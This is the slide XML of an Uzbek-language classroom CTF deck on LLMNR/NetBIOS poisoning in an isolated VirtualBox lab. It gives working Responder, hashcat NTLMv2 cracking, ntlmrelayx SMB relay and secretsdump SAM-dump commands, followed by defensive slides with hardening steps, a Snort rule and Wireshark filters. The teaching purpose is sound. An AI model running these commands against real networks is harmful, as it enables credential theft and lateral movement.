            <a:srgbClr val="FF4444">
              <a:alpha val="30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28800"/>
            <a:ext cx="2834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ATTACKER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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>💻 Kali Linux 2024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192.168.56.101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🔧 Responder, Hashcat, Impacket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9272" y="1828800"/>
            <a:ext cx="2834640" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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9272" y="1828800"/>
            <a:ext cx="2834640" cy="38404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828800"/>
            <a:ext cx="2834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VICTIM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0712" y="2267712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</a:rPr>
              <a:t>💻 Windows 11 Pro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0712" y="2542032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192.168.56.102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10712" y="2816352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🔧 SMB, NetBIOS, LLMNR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64224" y="1828800"/>
            <a:ext cx="2834640" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="2540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64224" y="1828800"/>
            <a:ext cx="2834640" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9B59B6">
              <a:alpha val="3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1828800"/>
            <a:ext cx="28346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DC (ixtiyoriy)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55664" y="2267712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59B6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>💻 Windows Server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2542032"/>
            <a:ext cx="26517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192.168.56.100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55664" y="2816352"/>
            <a:ext cx="2651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🔧 Active Directory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8595360" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2540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94760"/>
            <a:ext cx="8595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700"/>
                </a:solidFill>
              </a:rPr>
              <a:t>📡 Tarmoq: VirtualBox Host-Only Adapter | Subnet: 192.168.56.0/24 | NAT o'chirilgan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40740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</a:rPr>
              <a:t>Flags joylashuvi: CTF Walkthrough slaydida batafsil ko'rsatiladi →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CTF LAB: Windows 11 Pro Sozlash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</a:rPr>
              <a:t>Jabrlanuvchi mashinani tayyorlash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📋 PowerShell (Admin sifatida ishga tushiring):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8595360" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001122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17320"/>
            <a:ext cx="8321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LLMNR ni yoqish (zaif holat)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8321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 buyruq CTF uchun LLMNR ni yoqib qo'yadi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Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value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258568"/>
            <a:ext cx="8595360" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001122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286000"/>
            <a:ext cx="8321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NetBIOS ni yoqish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496312"/>
            <a:ext cx="8321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$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration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($a in $adapters) { $a.SetTcpipNetbios(1) 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127248"/>
            <a:ext cx="8595360" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001122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154680"/>
            <a:ext cx="8321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Test uchun noto'g'ri resursga murojaat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364992"/>
            <a:ext cx="8321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use * \\FILESERVER\secret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995928"/>
            <a:ext cx="8595360" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001122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4023360"/>
            <a:ext cx="8321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FLAG 1 ni o'rnatish (teacher ishlatadi)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233672"/>
            <a:ext cx="8321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$flag = "CTF{LLMNR_P01S0N1NG_D3T3CT3D}"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Set-Content -Path C:\Users\Public\flag1.txt -Value $flag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CTF LAB: Kali Linux Sozlash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</a:rPr>
              <a:t>Hujumchi mashinani tayyorlash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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>📦 1-QADAM: Vositalarni o'rnatish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44168"/>
            <a:ext cx="8595360" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100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71600"/>
            <a:ext cx="8321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update &amp;&amp; sudo apt install -y responder hashcat impacket-scripts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https://github.com/lgandx/Responder.git ~/tools/responder  # Agar yangi versiya kerak bo'lsa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2212848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🌐 2-QADAM: Tarmoq interfeysi tekshirish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596896"/>
            <a:ext cx="8595360" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00110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24328"/>
            <a:ext cx="8321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ip a                           # Interfeys nomini topish (eth0, eth1, wlan0)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ping 192.168.56.102             # Windows mashina bilan bog'lanishni tekshirish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3310128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⚙️ 3-QADAM: Responder konfiguratsiyasi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694176"/>
            <a:ext cx="8595360" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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21608"/>
            <a:ext cx="8321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/etc/responder/Responder.conf
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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SMB = On
  HTTP = On
  HTTPS = On
  DNS = On
  LLMNR = On
</a:t>
            </a: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responder -I eth0 -rdwv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A0D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🚩 CTF WALKTHROUGH — FLAG 1 &amp;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640080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A4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LLMNR Poisoning va Hash Capture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solidFill>
            <a:srgbClr val="FF4444">
              <a:alpha val="20000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="1905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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🚩 FLAG 1 → LLMNR Poisoning orqali NTLMv2 Hash ushlash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8595360" cy="411480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81328"/>
            <a:ext cx="914400" cy="411480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81328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Qadam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481328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Kali'da Responder ni ishga tushiring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81328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responder -I eth0 -rdwv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56816"/>
            <a:ext cx="8595360" cy="411480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56816"/>
            <a:ext cx="914400" cy="411480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956816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Qadam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1956816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Windows'da noto'g'ri resursga ulanishga harakat qiling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56816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use * \\FLAGSERVER\ctf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432304"/>
            <a:ext cx="8595360" cy="411480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432304"/>
            <a:ext cx="914400" cy="411480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32304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Qadam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2432304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Kali terminalida NTLMv2 hash paydo bo'ladi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432304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[SMB] NTLMv2-SSP Hash: user::CORP:...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8595360" cy="411480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07792"/>
            <a:ext cx="914400" cy="411480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907792"/>
            <a:ext cx="914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Qadam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2907792"/>
            <a:ext cx="3474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Hashni faylga nusxalang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907792"/>
            <a:ext cx="3931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/usr/share/responder/logs/SMB-NTLMv2-*.txt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401568"/>
            <a:ext cx="8595360" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="20000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="FF8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401568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00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🚩 FLAG 2 → Hashcat bilan Hash buzish va Parolni topish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822192"/>
            <a:ext cx="8595360" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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40480"/>
            <a:ext cx="83210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Hashcat bilan NTLMv2 hash buzish
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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Muvaffaqiyatli bo'lsa:
</a:t>
            </a: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hashcat -m 5600 hash.txt --show   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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FLAG: CTF{CR4CK3D_P4SS_P4SSW0RD}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🚩 CTF WALKTHROUGH — FLAG 3 &amp; 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solidFill>
            <a:srgbClr val="00D4FF">
              <a:alpha val="2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🚩 FLAG 3 → SMB Relay Hujumi (Impacket ntlmrelayx)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1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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97864"/>
            <a:ext cx="8321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Responder'da SMB'ni o'chiring (relay uchun)
</a:t>
            </a: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nano /etc/responder/Responder.conf   # SMB = Off, HTTP = Off
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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ntlmrelayx ni ishga tushiring
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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ntlmrelayx.py -t 192.168.56.102 -smb2support -i
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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Boshqa terminalda Responder'ni ishga tushiring
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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responder -I eth0 -rdwv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304288"/>
            <a:ext cx="8595360" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="20000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="00FF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304288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</a:rPr>
              <a:t>🚩 FLAG 4 → Relay bilan SAM Bazasidan Hashlarni chiqarish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8595360" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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24912"/>
            <a:ext cx="83210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Relay muvaffaqiyatli bo'lsa:
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1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secretsdump.py -just-dc-ntlm CORP/user@192.168.56.102
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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Yoki to'liq dump:
</a:t>
            </a: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secretsdump.py -sam -security -system SYSTEM SAM SECURITY LOCAL
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="105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FLAG joyi: C:\Users\Public\flag4.txt da saqlanadi (relay access bilan)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🏆 CTF BALL JADVALI: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224528"/>
            <a:ext cx="429768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4224528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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🚩 FLAG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4224528"/>
            <a:ext cx="2103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NTLMv2 Hash ushlash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4224528"/>
            <a:ext cx="777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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100 ball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4224528"/>
            <a:ext cx="429768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82312" y="4224528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</a:rPr>
              <a:t>🚩 FLAG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4224528"/>
            <a:ext cx="2103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Parolni buzish (Hashcat)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83880" y="4224528"/>
            <a:ext cx="777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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>150 ball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608576"/>
            <a:ext cx="429768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4608576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🚩 FLAG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0200" y="4608576"/>
            <a:ext cx="2103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SMB Relay hujumi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4608576"/>
            <a:ext cx="777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</a:rPr>
              <a:t>200 ball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4608576"/>
            <a:ext cx="4297680" cy="347472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82312" y="4608576"/>
            <a:ext cx="1188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</a:rPr>
              <a:t>🚩 FLAG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4608576"/>
            <a:ext cx="2103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SAM database dump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83880" y="4608576"/>
            <a:ext cx="777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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>250 ball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🛡️  HIMOYA USULLARI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</a:rPr>
              <a:t>LLMNR va NetBIOS hujumlaridan qanday himoyalanish kerak?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97680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔇  LLMNR ni o'chirish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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GPO: Computer Configuration → Admin Templates → Network → DNS Client → Turn off multicast name resolution → ENABLED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4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="F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01368"/>
            <a:ext cx="407822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 ADD HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient /v Ena...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97680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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0515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00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>📡  NetBIOS ni o'chirish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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DHCP server yoki regedit orqali barcha interfeyslarda NetBIOS over TCP/IP ni o'chirish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1801368"/>
            <a:ext cx="4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="FF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801368"/>
            <a:ext cx="407822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wmic nicconfig where (IPEnabled=TRUE) call SetTcpipNetbios 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297680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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33172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✍️ SMB Signing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65176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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SMB imzolashni majburiy qilish - relay hujumlarini bloklaydi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081528"/>
            <a:ext cx="4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00110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81528"/>
            <a:ext cx="407822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Set-SmbServerConfiguration -RequireSecuritySignature $true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09160" y="2286000"/>
            <a:ext cx="4297680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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233172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</a:rPr>
              <a:t>🔑  Kuchli Parollar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265176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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Murakkab parollar ishlatish - hashcat bilan buzilmaydigan parollar (15+ belgi, aralash)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081528"/>
            <a:ext cx="4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="00FF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081528"/>
            <a:ext cx="407822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accounts /minpwlen:15 /maxpwage:90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97680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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6118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</a:rPr>
              <a:t>🌐 WPAD ni o'chirish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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web Proxy Auto-Discovery Protocol - Responder tomonidan suiiste'mol qilinadi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361688"/>
            <a:ext cx="4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="635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361688"/>
            <a:ext cx="407822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 ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Sett...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09160" y="3566160"/>
            <a:ext cx="4297680" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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36118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👁️  IDS/IPS Monitoring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393192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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tarmoqda anomal LLMNR/NBT-NS so'rovlarini monitoring qilish (Wireshark, Snort, Zeek)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4361688"/>
            <a:ext cx="4114800" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100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4361688"/>
            <a:ext cx="4078224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alert udp any any -&gt; any 137 (msg:'NBT-NS Query'; sid:1000001;)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🔍 ANIQLASH: Wireshark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</a:rPr>
              <a:t>Hujumni tarmoqda qanday aniqlash mumkin?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</a:rPr>
              <a:t>🔬 Wireshark Filtrlari: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429768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FF8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44752"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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4475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udp.port == 5355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4447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LLMNR so'rovlarini ko'rish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444752"/>
            <a:ext cx="429768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44752"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00110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4475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udp.port == 137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14447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NetBIOS Name Service so'rovlari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75104"/>
            <a:ext cx="429768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75104"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100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75104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llmnr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1975104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Barcha LLMNR trafikini ko'rsatish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975104"/>
            <a:ext cx="429768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FFD7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975104"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0011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75104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78040" y="1975104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Barcha NetBIOS NS trafikini ko'rsatish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505456"/>
            <a:ext cx="429768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505456"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00110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05456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smb || smb2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2505456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SMB autentifikatsiya trafikini ko'rish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505456"/>
            <a:ext cx="4297680" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1270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505456"/>
            <a:ext cx="2377440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100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505456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ntlmssp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78040" y="2505456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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NTLM autentifikatsiya paketlari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090672"/>
            <a:ext cx="8595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</a:rPr>
              <a:t>🚨  Shubhali Belgiler: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3493008"/>
            <a:ext cx="8595360" cy="320040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9300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🔴 Bitta IP dan juda ko'p LLMNR so'rovlari → Responder ishlamoqda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858768"/>
            <a:ext cx="8595360" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D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85876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🟡 LLMNR so'rov → Darhol javob (normal emas, DNS tekshirilmagan)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224528"/>
            <a:ext cx="8595360" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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22452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🔴 NTLM autentifikatsiya → Tanilmagan IP ga (MITM belgi)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590288"/>
            <a:ext cx="8595360" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D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590288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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🟡 Kechasi yoki ish vaqtida bo'lmagan vaqtda NetBIOS burst trafiklar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7432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00FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DARS YAKUNLASH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6858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Bugun nima o'rgandik?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297680" cy="68580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71600"/>
            <a:ext cx="594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4173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</a:rPr>
              <a:t>NetBIOS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709928"/>
            <a:ext cx="3566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1983 yildan beri ishlatilayotgan zaif protokol - UDP 137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297680" cy="68580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371600"/>
            <a:ext cx="594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30952" y="14173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</a:rPr>
              <a:t>LLMNR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30952" y="1709928"/>
            <a:ext cx="3566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DNS'ning muqobili - multicast, IPv4/IPv6, UDP 5355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297680" cy="68580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176272"/>
            <a:ext cx="594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☠️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6112" y="222199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</a:rPr>
              <a:t>Zaharlanish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514600"/>
            <a:ext cx="3566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Broadcast so'rovlarga soxta javob → NTLM hash ushlash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176272"/>
            <a:ext cx="4297680" cy="68580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2176272"/>
            <a:ext cx="594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30952" y="222199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</a:rPr>
              <a:t>Responder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30952" y="2514600"/>
            <a:ext cx="3566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Kali Linux da LLMNR/NBT-NS zaharlanish vositasi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80944"/>
            <a:ext cx="4297680" cy="68580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980944"/>
            <a:ext cx="594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3026664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</a:rPr>
              <a:t>Hashcat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" y="3319272"/>
            <a:ext cx="3566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Offline NTLMv2 hash buzish vositasi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980944"/>
            <a:ext cx="4297680" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00FF4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2980944"/>
            <a:ext cx="594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30952" y="3026664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</a:rPr>
              <a:t>Himoya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30952" y="3319272"/>
            <a:ext cx="35661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</a:rPr>
              <a:t>LLMNR/NetBIOS o'chirish, SMB Signing, kuchli parollar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1A2540"/>
          </a:solidFill>
          <a:ln w="1905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🎯 Maqsad: Hujumlarni tushunib, himoya qurishni o'rganish | Ethical Hacking = Ruxsat + Bilim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10208</Words>
  <Application>WPS Presentation</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>657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SimSun</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>DejaVu Sans</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Quicksand Light</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Microsoft YaHei</vt:lpstr>
      <vt:lpstr>Droid Sans Fallback</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Fira Code</vt:lpstr>
      <vt:lpstr>FreeSans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NetBIOS va LLMNR Zaharlanishi - CTF Darsi</dc:title>
  <dc:creator>Kiberxavfsizlik O'qituvchisi</dc:creator>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <cp:lastModifiedBy>lobo</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-16T06:48:19Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-16T06:48:19Z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